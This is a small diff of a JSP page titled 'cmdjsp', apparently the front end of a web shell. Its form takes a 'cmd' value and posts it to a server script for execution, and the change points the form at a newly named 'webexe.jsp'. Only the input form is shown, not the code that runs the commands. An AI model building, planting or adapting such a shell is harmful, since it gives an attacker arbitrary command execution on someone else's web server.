@@ -6,7 +6,7 @@
 <title>cmdjsp</title>
 </head>
 <body>
-	<FORM METHOD=GET ACTION='2.jsp'>
+	<FORM METHOD=GET ACTION='webexe.jsp'>
 		<INPUT name='cmd' type=text> <INPUT type=submit value='Run'>
 	</FORM>
 
